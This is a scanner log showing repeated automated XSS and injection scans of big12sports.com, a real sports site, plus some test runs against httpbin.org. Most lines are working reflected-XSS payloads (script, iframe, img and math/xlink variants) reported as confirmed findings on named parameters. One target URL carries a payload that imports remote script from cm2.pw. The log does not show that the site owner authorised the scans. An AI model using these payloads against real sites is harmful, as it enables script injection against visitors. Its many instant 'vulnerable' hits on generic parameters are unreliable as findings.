+2026-03-22 19:52:48,857 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?CAT_SPORT_ID=%22%3E%3Ciframe+src%3D%22data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E
+2026-03-22 19:52:50,048 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: CAT_SPORT_ID
+2026-03-22 19:52:50,048 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?CAT_SPORT_ID=%22%3E%3Cimg+src%3D%22data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E
+2026-03-22 19:52:55,000 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: CAT_SPORT_ID
+2026-03-22 19:52:55,000 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?CAT_SPORT_ID=%22%3E%3Cmath%3E%3Cmi+xlink%3Ahref%3D%22data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Exss%3C%2Fmi%3E%3C%2Fmath%3E
+2026-03-22 19:53:05,385 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: CAT_SPORT_ID
+2026-03-22 19:53:05,386 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?CAT_SPORT_ID=%22%3E%3CScRiPt%3Ealert%281%29%3C%2FScRiPt%3E
+2026-03-22 19:53:06,859 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: CAT_SPORT_ID
+2026-03-22 19:53:06,859 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?CAT_SPORT_ID=%22%3E%3CSCRIPT%3Ealert%281%29%3C%2FSCRIPT%3E
+2026-03-22 19:53:07,370 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: CONTENT_ID
+2026-03-22 19:53:07,372 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?CONTENT_ID=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+2026-03-22 19:53:46,764 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: CONTENT_ID
+2026-03-22 19:53:46,774 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?CONTENT_ID=%22%3E%3Ciframe+src%3D%22data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E
+2026-03-22 19:53:47,528 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: CONTENT_ID
+2026-03-22 19:53:47,528 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?CONTENT_ID=%22%3E%3Cimg+src%3D%22data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E
+2026-03-22 19:53:54,122 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: CONTENT_ID
+2026-03-22 19:53:54,123 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?CONTENT_ID=%22%3E%3Cmath%3E%3Cmi+xlink%3Ahref%3D%22data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Exss%3C%2Fmi%3E%3C%2Fmath%3E
+2026-03-22 19:54:01,911 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: CONTENT_ID
+2026-03-22 19:54:01,912 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?CONTENT_ID=%22%3E%3CScRiPt%3Ealert%281%29%3C%2FScRiPt%3E
+2026-03-22 19:54:04,438 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: CONTENT_ID
+2026-03-22 19:54:04,439 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?CONTENT_ID=%22%3E%3CSCRIPT%3Ealert%281%29%3C%2FSCRIPT%3E
+2026-03-22 19:54:04,811 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: amp;DB_OEM_ID
+2026-03-22 19:54:04,812 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?amp%3BDB_OEM_ID=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+2026-03-22 19:54:43,201 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: amp;DB_OEM_ID
+2026-03-22 19:54:43,201 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?amp%3BDB_OEM_ID=%22%3E%3Ciframe+src%3D%22data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E
+2026-03-22 19:54:45,035 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: amp;DB_OEM_ID
+2026-03-22 19:54:45,035 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?amp%3BDB_OEM_ID=%22%3E%3Cimg+src%3D%22data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E
+2026-03-22 19:54:51,854 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: amp;DB_OEM_ID
+2026-03-22 19:54:51,854 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?amp%3BDB_OEM_ID=%22%3E%3Cmath%3E%3Cmi+xlink%3Ahref%3D%22data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Exss%3C%2Fmi%3E%3C%2Fmath%3E
+2026-03-22 19:55:02,440 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: amp;DB_OEM_ID
+2026-03-22 19:55:02,441 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?amp%3BDB_OEM_ID=%22%3E%3CScRiPt%3Ealert%281%29%3C%2FScRiPt%3E
+2026-03-22 19:55:03,010 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: amp;DB_OEM_ID
+2026-03-22 19:55:03,011 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?amp%3BDB_OEM_ID=%22%3E%3CSCRIPT%3Ealert%281%29%3C%2FSCRIPT%3E
+2026-03-22 19:55:05,412 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: zipcode
+2026-03-22 19:55:05,414 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?zipcode=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+2026-03-22 19:55:39,857 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: zipcode
+2026-03-22 19:55:39,857 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?zipcode=%22%3E%3Ciframe+src%3D%22data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E
+2026-03-22 19:55:40,442 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: zipcode
+2026-03-22 19:55:40,442 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?zipcode=%22%3E%3Cimg+src%3D%22data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E
+2026-03-22 19:55:47,064 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: zipcode
+2026-03-22 19:55:47,064 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?zipcode=%22%3E%3Cmath%3E%3Cmi+xlink%3Ahref%3D%22data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Exss%3C%2Fmi%3E%3C%2Fmath%3E
+2026-03-22 19:55:55,690 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: zipcode
+2026-03-22 19:55:55,692 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?zipcode=%22%3E%3CScRiPt%3Ealert%281%29%3C%2FScRiPt%3E
+2026-03-22 19:55:58,566 - VulnerabilityScanner - INFO - ✅ [XSS] Found XSS vulnerability: zipcode
+2026-03-22 19:55:58,568 - VulnerabilityScanner - INFO -     URL: https://big12sports.com?zipcode=%22%3E%3CSCRIPT%3Ealert%281%29%3C%2FSCRIPT%3E
+2026-03-22 19:55:59,155 - VulnerabilityScanner - INFO - ✅ [XSS] Found multi-parameter vulnerability: ['SPID', 'ATCLID', 'partner', 'PALBID', 'DB_OEM_ID']
+2026-03-22 19:56:05,868 - VulnerabilityScanner - INFO - ✅ XSS scan complete
+2026-03-22 19:56:05,882 - VulnerabilityScanner - INFO - 🔍 [PATH-XSS] Starting path-based XSS scanning...
+2026-03-22 19:56:05,883 - VulnerabilityScanner - INFO - 🔍 [CUSTOM-PARAM] Starting custom parameter injection scanning...
+2026-03-22 19:56:08,151 - VulnerabilityScanner - INFO - ✅ [CUSTOM-PARAM] Found vulnerability in parameter: test
+2026-03-22 19:56:09,109 - VulnerabilityScanner - INFO - ✅ [CUSTOM-PARAM] Found vulnerability in parameter: debug
+2026-03-22 19:56:09,803 - VulnerabilityScanner - INFO - ✅ [CUSTOM-PARAM] Found vulnerability in parameter: param
+2026-03-22 19:56:10,028 - VulnerabilityScanner - INFO - ✅ [CUSTOM-PARAM] Found vulnerability in parameter: value
+2026-03-22 19:56:12,708 - VulnerabilityScanner - INFO - ✅ [CUSTOM-PARAM] Found vulnerability in parameter: input
+2026-03-22 19:56:13,966 - VulnerabilityScanner - INFO - ✅ [CUSTOM-PARAM] Found vulnerability in parameter: data
+2026-03-22 19:56:14,722 - VulnerabilityScanner - INFO - ✅ [CUSTOM-PARAM] Found vulnerability in parameter: payload
+2026-03-22 19:56:15,736 - VulnerabilityScanner - INFO - ✅ [CUSTOM-PARAM] Found vulnerability in parameter: xss
+2026-03-22 19:56:16,514 - VulnerabilityScanner - INFO - ✅ [CUSTOM-PARAM] Found vulnerability in parameter: injection
+2026-03-22 19:56:18,508 - VulnerabilityScanner - INFO - ✅ [CUSTOM-PARAM] Found vulnerability in parameter: keyword
+2026-03-22 19:56:18,593 - VulnerabilityScanner - INFO - ✅ [CUSTOM-PARAM] Found vulnerability in parameter: search
+2026-03-22 19:56:20,658 - VulnerabilityScanner - INFO - ✅ [CUSTOM-PARAM] Found vulnerability in parameter: q
+2026-03-22 19:56:21,832 - VulnerabilityScanner - INFO - ✅ [CUSTOM-PARAM] Found vulnerability in parameter: query
+2026-03-22 19:56:22,433 - VulnerabilityScanner - INFO - ✅ [CUSTOM-PARAM] Found vulnerability in parameter: id
+2026-03-22 19:56:23,297 - VulnerabilityScanner - INFO - ✅ [CUSTOM-PARAM] Found vulnerability in parameter: user
+2026-03-22 19:56:24,233 - VulnerabilityScanner - INFO - ✅ [CUSTOM-PARAM] Found vulnerability in parameter: username
+2026-03-22 19:56:26,859 - VulnerabilityScanner - INFO - ✅ [CUSTOM-PARAM] Found vulnerability in parameter: password
+2026-03-22 19:56:27,636 - VulnerabilityScanner - INFO - ✅ [CUSTOM-PARAM] Found vulnerability in parameter: email
+2026-03-22 19:56:29,602 - VulnerabilityScanner - INFO - ✅ [CUSTOM-PARAM] Found vulnerability in parameter: comment
+2026-03-22 19:56:29,621 - VulnerabilityScanner - INFO - ✅ [CUSTOM-PARAM] Found vulnerability in parameter: message
+2026-03-22 19:56:32,091 - VulnerabilityScanner - INFO - ✅ [CUSTOM-PARAM] Found vulnerability in parameter: name
+2026-03-22 19:56:32,580 - VulnerabilityScanner - INFO - ✅ [CUSTOM-PARAM] Found vulnerability in parameter: callback
+2026-03-22 19:56:33,585 - VulnerabilityScanner - INFO - ✅ [CUSTOM-PARAM] Found vulnerability in parameter: url
+2026-03-22 19:56:34,304 - VulnerabilityScanner - INFO - ✅ [CUSTOM-PARAM] Found vulnerability in parameter: redirect
+2026-03-22 19:56:37,097 - VulnerabilityScanner - INFO - ✅ [CUSTOM-PARAM] Found vulnerability in parameter: return
+2026-03-22 19:56:37,605 - VulnerabilityScanner - INFO - ✅ [CUSTOM-PARAM] Found vulnerability in parameter: next
+2026-03-22 19:56:39,117 - VulnerabilityScanner - INFO - ✅ [CUSTOM-PARAM] Found vulnerability in parameter: continue
+2026-03-22 19:56:40,194 - VulnerabilityScanner - INFO - ✅ [CUSTOM-PARAM] Found vulnerability in parameter: page
+2026-03-22 19:56:40,560 - VulnerabilityScanner - INFO - ✅ [CUSTOM-PARAM] Found vulnerability in parameter: category
+2026-03-22 19:56:41,727 - VulnerabilityScanner - INFO - ✅ [CUSTOM-PARAM] Found vulnerability in parameter: type
+2026-03-22 19:56:43,043 - VulnerabilityScanner - INFO - ✅ [CUSTOM-PARAM] Found vulnerability in parameter: sort
+2026-03-22 19:56:45,128 - VulnerabilityScanner - INFO - ✅ [CUSTOM-PARAM] Found vulnerability in parameter: filter
+2026-03-22 19:56:46,269 - VulnerabilityScanner - INFO - ✅ [CUSTOM-PARAM] Found vulnerability in parameter: tag
+2026-03-22 19:56:47,038 - VulnerabilityScanner - INFO - ✅ [CUSTOM-PARAM] Found vulnerability in parameter: ref
+2026-03-22 19:56:48,386 - VulnerabilityScanner - INFO - ✅ Custom parameter injection scan complete
+2026-03-22 19:56:48,388 - VulnerabilityScanner - INFO - 🔍 [NUCLEI-ADVANCED] Starting advanced template scanning...
+2026-03-22 21:35:45,081 - VulnerabilityScanner - INFO - Scanner initialized for: https://big12sports.com
+2026-03-22 21:58:07,761 - VulnerabilityScanner - INFO - Scanner initialized for: https://big12sports.com
+2026-03-22 21:58:07,762 - VulnerabilityScanner - INFO - ⚡ Deep scanning mode enabled
+2026-03-22 21:58:07,762 - VulnerabilityScanner - WARNING - ⚠️  No parameters found in URL, discovering from domain...
+2026-03-22 21:58:07,762 - VulnerabilityScanner - INFO - 🔍 [PARAM-DISCOVERY] Starting parameter discovery...
+2026-03-22 21:59:48,326 - VulnerabilityScanner - INFO - ✅ Discovered 13 parameters: DB_OEM_ID, CURRENT_PAGE, amp;DB_OEM_ID, PALBID, MONITOR_AD_ID, zipcode, DB_LANG, SPID, SPSID, ATCLID
+2026-03-22 21:59:48,326 - VulnerabilityScanner - INFO - ✓ Discovered 13 parameters from domain
+2026-03-22 21:59:48,326 - VulnerabilityScanner - INFO - Testing 13 parameter(s)
+2026-03-22 21:59:48,326 - VulnerabilityScanner - INFO - 🔍 [XSS] Starting XSS scan...
+2026-03-22 22:15:28,811 - VulnerabilityScanner - INFO - ✅ XSS scan complete
+2026-03-22 22:15:28,846 - VulnerabilityScanner - INFO - 🔍 [PATH-XSS] Starting path-based XSS scanning...
+2026-03-22 22:15:28,846 - VulnerabilityScanner - INFO - 🔍 [CUSTOM-PARAM] Starting custom parameter injection scanning...
+2026-03-22 22:16:11,167 - VulnerabilityScanner - INFO - ✅ Custom parameter injection scan complete
+2026-03-22 22:16:11,167 - VulnerabilityScanner - INFO - 🔍 [NUCLEI-ADVANCED] Starting advanced template scanning...
+2026-03-22 22:27:46,262 - VulnerabilityScanner - INFO - Scanner initialized for: https://big12sports.com/schedule.aspx?amp&path=tennis&print=true&schedule=4848&xss=%22oncontentvisibilityautostatechange%3Dimport(%27//cm2.pw%27)%20style%3Ddisplay%3Ablock%3Bcontent-visibility%3Aauto%3E
+2026-03-22 22:27:46,262 - VulnerabilityScanner - INFO - Testing 33 parameter(s)
+2026-03-22 22:27:46,263 - VulnerabilityScanner - INFO - 🔍 [XSS] Starting XSS scan...
+2026-03-23 10:05:16,483 - VulnerabilityScanner - INFO - Scanner initialized for: https://big12sports.com
+2026-03-23 10:05:16,483 - VulnerabilityScanner - INFO - ⚡ Deep scanning mode enabled
+2026-03-23 10:05:16,484 - VulnerabilityScanner - WARNING - ⚠️  No parameters found in URL, discovering from domain...
+2026-03-23 10:05:16,484 - VulnerabilityScanner - INFO - 🔍 [PARAM-DISCOVERY] Starting parameter discovery...
+2026-03-23 10:06:56,943 - VulnerabilityScanner - INFO - ✅ Discovered 13 parameters: PALBID, CONTENT_ID, DB_OEM_ID, MONITOR_AD_ID, partner, amp;DB_OEM_ID, CAT_SPORT_ID, ATCLID, SPID, SPSID
+2026-03-23 10:06:56,943 - VulnerabilityScanner - INFO - ✓ Discovered 13 parameters from domain, testing 42 total with common defaults
+2026-03-23 10:06:56,943 - VulnerabilityScanner - INFO - Testing 42 parameter(s)
+2026-03-23 10:06:56,943 - VulnerabilityScanner - INFO - 🔍 [XSS] Starting XSS scan...
+2026-03-23 10:12:59,061 - VulnerabilityScanner - INFO - Scanner initialized for: https://big12sports.com
+2026-03-23 10:12:59,061 - VulnerabilityScanner - INFO - ⚡ Deep scanning mode enabled
+2026-03-23 10:12:59,061 - VulnerabilityScanner - WARNING - ⚠️  No parameters found in URL, discovering from domain...
+2026-03-23 10:12:59,061 - VulnerabilityScanner - INFO - 🔍 [PARAM-DISCOVERY] Starting parameter discovery...
+2026-03-23 10:14:39,339 - VulnerabilityScanner - INFO - ✅ Discovered 13 parameters: SPID, ATCLID, PALBID, DB_LANG, DB_OEM_ID, partner, CURRENT_PAGE, SPSID, CONTENT_ID, MONITOR_AD_ID
+2026-03-23 10:14:39,339 - VulnerabilityScanner - INFO - ✓ Discovered 13 parameters from domain, testing 42 total with common defaults
+2026-03-23 10:14:39,339 - VulnerabilityScanner - INFO - Testing 42 parameter(s)
+2026-03-23 10:14:39,339 - VulnerabilityScanner - INFO - 🔍 [XSS] Starting XSS scan...
+2026-03-23 10:28:52,899 - VulnerabilityScanner - INFO - Scanner initialized for: https://big12sports.com
+2026-03-23 10:28:52,900 - VulnerabilityScanner - INFO - ⚡ Deep scanning mode enabled
+2026-03-23 10:28:52,900 - VulnerabilityScanner - WARNING - ⚠️  No parameters found in URL, discovering from domain...
+2026-03-23 10:28:52,900 - VulnerabilityScanner - INFO - 🔍 [PARAM-DISCOVERY] Starting parameter discovery...
+2026-03-23 10:31:53,196 - VulnerabilityScanner - WARNING - ⚠️  No parameters discovered, using common defaults
+2026-03-23 10:31:53,196 - VulnerabilityScanner - INFO - Testing 29 parameter(s)
+2026-03-23 10:31:53,196 - VulnerabilityScanner - INFO - 🔍 [XSS] Starting XSS scan...
+2026-03-23 10:46:05,918 - VulnerabilityScanner - INFO - Scanner initialized for: https://big12sports.com/schedule.aspx?amp&path=tennis&print=true&schedule=4848&xss=%22oncontentvisibilityautostatechange%3Dimport(%27//cm2.pw%27)%20style%3Ddisplay%3Ablock%3Bcontent-visibility%3Aauto%3E
+2026-03-23 10:46:05,919 - VulnerabilityScanner - INFO - Testing 33 parameter(s)
+2026-03-23 10:46:05,919 - VulnerabilityScanner - INFO - 🔍 [XSS] Starting XSS scan...
+2026-03-23 10:46:05,919 - VulnerabilityScanner - INFO - ⚠️  XSS verbose mode - testing with dangerous payloads
+2026-03-23 10:47:17,427 - VulnerabilityScanner - INFO - Scanner initialized for: https://big12sports.com/schedule.aspx?amp&path=tennis&print=true&schedule=4848&xss=%22oncontentvisibilityautostatechange%3Dimport(%27//cm2.pw%27)%20style%3Ddisplay%3Ablock%3Bcontent-visibility%3Aauto%3E
+2026-03-23 10:47:17,427 - VulnerabilityScanner - INFO - Testing 33 parameter(s)
+2026-03-23 10:47:17,427 - VulnerabilityScanner - INFO - 🔍 [XSS] Starting XSS scan...
+2026-03-23 10:47:17,427 - VulnerabilityScanner - INFO - 📍 Using marker injection mode - testing for parameter reflection only
+2026-03-23 10:47:28,684 - VulnerabilityScanner - INFO - ✅ XSS marker injection scan complete
+2026-03-23 10:47:28,684 - VulnerabilityScanner - INFO - 🔍 [NUCLEI] Starting Nuclei template-based scanning...
+2026-03-23 10:47:42,938 - VulnerabilityScanner - INFO - ✅ Nuclei scan completed with no vulnerabilities
+2026-03-23 10:47:47,661 - VulnerabilityScanner - INFO - Scanner initialized for: https://big12sports.com/schedule.aspx?amp&path=tennis&print=true&schedule=4848&xss=test
+2026-03-23 10:47:47,661 - VulnerabilityScanner - INFO - Testing 33 parameter(s)
+2026-03-23 10:47:47,661 - VulnerabilityScanner - INFO - 🔍 [XSS] Starting XSS scan...
+2026-03-23 10:47:47,661 - VulnerabilityScanner - INFO - 📍 Using marker injection mode - testing for parameter reflection only
+2026-03-23 10:47:58,981 - VulnerabilityScanner - INFO - ✅ XSS marker injection scan complete
+2026-03-23 10:47:58,981 - VulnerabilityScanner - INFO - 🔍 [NUCLEI] Starting Nuclei template-based scanning...
+2026-03-23 10:48:48,180 - VulnerabilityScanner - INFO - Scanner initialized for: https://big12sports.com
+2026-03-23 10:48:48,180 - VulnerabilityScanner - WARNING - ⚠️  No parameters found in URL, discovering from domain...
+2026-03-23 10:48:48,180 - VulnerabilityScanner - INFO - 🔍 [PARAM-DISCOVERY] Starting parameter discovery...
+2026-03-23 10:48:48,180 - VulnerabilityScanner - INFO - 🌐 Attempting Playwright headless browser crawling...
+2026-03-23 10:50:07,948 - VulnerabilityScanner - INFO - Scanner initialized for: https://httpbin.org/anything
+2026-03-23 10:50:12,681 - VulnerabilityScanner - INFO - Scanner initialized for: https://httpbin.org/anything?test=123
+2026-03-23 10:50:12,681 - VulnerabilityScanner - INFO - Testing 29 parameter(s)
+2026-03-23 10:50:12,681 - VulnerabilityScanner - INFO - 🔍 [XSS] Starting XSS scan...
+2026-03-23 10:50:12,681 - VulnerabilityScanner - INFO - 📍 Using marker injection mode - testing for parameter reflection only
+2026-03-23 10:50:14,285 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: category
+2026-03-23 10:50:14,285 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=123&category=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 10:50:14,287 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: username
+2026-03-23 10:50:14,289 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: payload
+2026-03-23 10:50:14,291 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: q
+2026-03-23 10:50:14,293 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=123&username=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 10:50:14,294 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: callback
+2026-03-23 10:50:14,295 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: return
+2026-03-23 10:50:14,295 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=123&payload=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 10:50:14,297 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=123&callback=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 10:50:14,297 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=123&q=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 10:50:14,297 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=123&return=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 10:50:14,297 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: next
+2026-03-23 10:50:14,300 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=123&next=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 10:50:14,421 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: tag
+2026-03-23 10:50:14,421 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=123&tag=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 10:50:14,463 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: type
+2026-03-23 10:50:14,463 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=123&type=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 10:50:14,666 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: search
+2026-03-23 10:50:14,667 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=123&search=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 10:50:16,202 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: input
+2026-03-23 10:50:16,202 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=123&input=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 10:50:16,205 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: keyword
+2026-03-23 10:50:16,205 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=123&keyword=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 10:50:16,208 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: redirect
+2026-03-23 10:50:16,207 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: user
+2026-03-23 10:50:16,209 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=123&user=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 10:50:16,209 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=123&redirect=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 10:50:16,212 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: data
+2026-03-23 10:50:16,213 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=123&data=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 10:50:16,371 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: email
+2026-03-23 10:50:16,373 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=123&email=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 10:50:16,372 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: message
+2026-03-23 10:50:16,374 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: comment
+2026-03-23 10:50:16,376 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=123&message=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 10:50:16,377 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: sort
+2026-03-23 10:50:16,377 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=123&comment=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 10:50:16,378 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=123&sort=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 10:50:16,455 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: id
+2026-03-23 10:50:16,456 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=123&id=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 10:50:18,067 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: name
+2026-03-23 10:50:18,068 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=123&name=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 10:50:18,068 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: test
+2026-03-23 10:50:18,069 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 10:50:18,151 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: param
+2026-03-23 10:50:18,152 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=123&param=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 10:50:18,154 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: value
+2026-03-23 10:50:18,155 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=123&value=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 10:50:18,155 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: filter
+2026-03-23 10:50:18,157 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=123&filter=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 10:50:18,156 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: page
+2026-03-23 10:50:18,157 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=123&page=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 10:50:18,533 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: xss
+2026-03-23 10:50:18,534 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=123&xss=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 10:50:18,533 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: debug
+2026-03-23 10:50:18,534 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=123&debug=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 10:50:18,565 - VulnerabilityScanner - INFO - ✅ [INJECTABLE] Found injectable parameter: url
+2026-03-23 10:50:18,565 - VulnerabilityScanner - INFO -     URL: https://httpbin.org/anything?test=123&url=%22%3E%3Cs%3Esuperman%3C%2Fs%3E
+2026-03-23 10:50:18,566 - VulnerabilityScanner - INFO - ✅ XSS marker injection scan complete
+2026-03-23 10:50:18,566 - VulnerabilityScanner - INFO - 🔍 [NUCLEI] Starting Nuclei template-based scanning...
+2026-03-23 10:50:18,665 - VulnerabilityScanner - INFO - Running: nuclei -u https://httpbin.org/anything?test=123 -t cves,vulnerabilities,misconfigurations -json -severity critical,high,medium -timeout 30
+2026-03-23 10:50:32,984 - VulnerabilityScanner - INFO - ✅ Nuclei scan completed with no vulnerabilities
+2026-03-23 10:50:40,148 - VulnerabilityScanner - INFO - Scanner initialized for: https://httpbin.org/anything?test=hello
